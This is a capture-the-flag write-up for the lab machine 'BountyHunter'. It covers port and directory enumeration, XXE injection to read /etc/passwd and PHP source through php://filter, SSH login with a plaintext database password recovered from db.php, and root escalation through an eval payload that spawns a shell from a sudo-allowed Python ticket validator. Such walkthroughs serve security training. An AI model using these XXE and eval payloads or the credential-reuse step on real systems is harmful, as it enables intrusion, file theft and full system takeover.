# BountyHunter

- Target Machine: 10.10.11.100

## Enumeration

### nmap scan

```log
# Nmap 7.92SVN scan initiated Wed Sep  8 12:25:45 2021 as: nmap -p- -sC -sV -oN nmap/all_ports.log 10.10.11.100
Nmap scan report for 10.10.11.100
Host is up (0.048s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  3072 d4:4c:f5:79:9a:79:a3:b0:f1:66:25:52:c9:53:1f:e1 (RSA)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Sep  8 12:26:32 2021 -- 1 IP address (1 host up) scanned in 47.75 seconds
```

### gobuster scan

```log
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.11.100/assets/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.100/css/]
/index.php            (Status: 200) [Size: 25169]
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.100/js/]
/resources            (Status: 301) [Size: 316] [--> http://10.10.11.100/resources/]
/server-status        (Status: 403) [Size: 277]
```

### Looking through the web site resources

The website homepage contains a link to the page `portal.php`, which also contains a link to `log_submit.php`. This page contains a form with some input field. Once the form gets submitted, this page runs the JS code written in `bountylog.js`, which sends a POST request to the page `tracker_diRbPr00f314.php` with the input fields formatted as an encoded XML data structure.

/resources/README.txt

```
Tasks:

[ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
[X] Write tracker submit script
[ ] Connect tracker submit script to the database
[X] Fix developer group permissions
```

/resources/bountylog.js

```
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}

```

We can mimic this functions with a [python script](scripts/xxe_inj.py), sending our own XML data to the `tracker_diRbPr00f314.php` page and try to exploit an XXE injection vulnerability.
__ATTENTION__: check the python script to know what we are doing

```bash
[exyss@exyss BountyHunter]$ python scripts/xxe_inj.py file:///etc/passwd
XXE INJECTION::
------------------------------
file:///etc/passwd

OUTPUT:
------------------------------
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
```

As we can see, the XXE injection works, meaning we can abuse this to get the source files of this website.

```bash
[exyss@exyss BountyHunter]$ python scripts/xxe_inj.py php://filter/convert.base64-encode/resource=index.php --output-only | base64 -d > src/index.php

[exyss@exyss BountyHunter]$ python scripts/xxe_inj.py php://filter/convert.base64-encode/resource=portal.php --output-only | base64 -d > src/portal.php

[exyss@exyss BountyHunter]$ python scripts/xxe_inj.py php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php --output-only | base64 -d > src/tracker_diRbPr00f314.php

[exyss@exyss BountyHunter]$ python scripts/xxe_inj.py php://filter/convert.base64-encode/resource=db.php --output-only | base64 -d > src/db.php
```

Inside db.php we can find some admin credentials:

```php
<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>
```

## Accessing the machine

As we saw in the output of the file `/etc/passwd` in the first XXE injection, there is an user called `development` with an home folder. We can try accessing it with SSH using the db password. The user flag is in the home dir with an useful "hint" left by the system admin:

```
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
```

## Priviledge escalation

Since the SysAdmin updated our priviledges, let's have a look at what we can do:

```bash
development@bountyhunter:~$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
```

As we can see, we can run `/usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py` as root without password.
Let's have a look at that python script:

```py
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()
```

We have to reverse engineer the ticket validation in order to get our payload into the eval method inside the evaluate function. The resulting ticket file is:

```
development@bountyhunter:~$ cat ticket.md 
# Skytrain Inc
## Ticket to FILLER
__Ticket Code:__
**116+(True and __import__('os').system('/bin/bash'))

development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
ticket.md
Destination: FILLER

root@bountyhunter:/home/development# 
```

The root flag is in /root